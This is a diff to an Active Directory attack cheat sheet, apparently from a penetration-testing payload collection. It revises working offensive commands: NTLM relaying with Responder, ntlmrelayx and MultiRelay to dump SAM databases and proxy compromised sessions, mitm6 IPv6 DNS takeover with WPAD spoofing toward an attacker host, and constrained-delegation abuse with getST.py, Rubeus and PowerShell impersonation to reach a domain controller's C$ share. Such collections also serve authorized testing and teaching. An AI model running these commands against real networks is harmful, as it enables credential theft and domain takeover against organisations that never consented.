@@ -50,7 +50,7 @@
       - [Using impacket](#using-impacket)
       - [Using Rubeus](#using-rubeus)
     - [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
-    - [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
+    - [Man-in-the-Middle attacks & relaying](#man-in-the-middle-attacks--relaying)
       - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
       - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
       - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
@@ -1436,7 +1436,7 @@ Then crack the hash with `hashcat`
 hashcat -m 5600 -a 0 hash.txt crackstation.txt
 ```
 
-### NTLMv2 hashes relaying
+### Man-in-the-Middle attacks & relaying
 
 NTLMv1 and NTLMv2 can be relayed to connect to another machine.
 
@@ -1473,14 +1473,13 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     HTTP = Off    # Turn this off
     ```
 2. Run `python  RunFinger.py -i IP_Range` to detect machine with `SMB signing`:`disabled`.
-3. Run `python Responder.py -I <interface_card>` and `python MultiRelay.py -t <target_machine_IP> -u ALL`
-4. Also you can use `ntlmrelayx` to dump the SAM database of the targets in the list. 
-    ```powershell
-    ntlmrelayx.py -tf targets.txt
-    ```
+3. Run `python Responder.py -I <interface_card>` 
+4. Use a relay tool such as `ntlmrelayx` or `MultiRelay`
+    - `impacket-ntlmrelayx -tf targets.txt` to dump the SAM database of the targets in the list. 
+    - `python MultiRelay.py -t <target_machine_IP> -u ALL`
 5. ntlmrelayx can also act as a SOCK proxy with every compromised sessions.
     ```powershell
-    $ ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support
+    $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
     [*] Servers started, waiting for connections
     Type help for list of commands
     ntlmrelayx> socks
@@ -1489,12 +1488,18 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
     SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
     MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
-    
-    $ proxychains smbclient //192.168.48.230/Users -U contoso/normaluser1
-    $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
+
+    # You might need to select a target with "-t"
+    impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
+    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support
+
+    # the socks proxy can then be used with your Impacket tools or CrackMapExec
+    $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
+    $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
+    $ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
     ```
 
-Mitigations:
+**Mitigations**:
 
  * Disable LLMNR via group policy
     ```powershell
@@ -1510,15 +1515,21 @@ Mitigations:
 Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
 
 ```powershell
-cme smb $hosts --gen-relay-list relay.txt
+crackmapexec smb $hosts --gen-relay-list relay.txt
 
 # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
+# -d is the domain name that we filter our request on - the attacked domain
+# -i is the interface we have mitm6 listen on for events
 mitm6 -i eth0 -d $domain
 
 # spoofing WPAD and relaying NTLM credentials
-ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
-or 
-ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
+impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
+
+# -ip is the interface you want the relay to run on
+# -wh is for WPAD host, specifying your wpad file to serve
+# -t is the target where you want to relay to. 
+impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
 ```
 
 #### Drop the MIC
@@ -1984,8 +1995,10 @@ $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname
 
 # Find the service 
 $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo
+```
 
-# Exploit with Impacket
+#### Exploit with Impacket
+```ps1
 $ getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
@@ -1994,14 +2007,28 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*]     Requesting S4U2self
 [*]     Requesting S4U2Proxy
 [*] Saving ticket in Administrator.ccache
+```
 
-# Exploit with Rubeus
+#### Exploit with Rubeus
+```ps1
 $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:...
 $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
 $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
 $ dir \\dc.domain.com\c$
 ```
 
+#### Impersonate a domain user on a resource
+
+Require:
+* SYSTEM level privileges on a machine configured with constrained delegation
+
+```ps1
+PS> [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+PS> $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
+PS> $idToImpersonate.Impersonate()
+PS> [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
+PS> ls \\dc01.offense.local\c$
+```
 
 ### Kerberos Resource Based Constrained Delegation
 
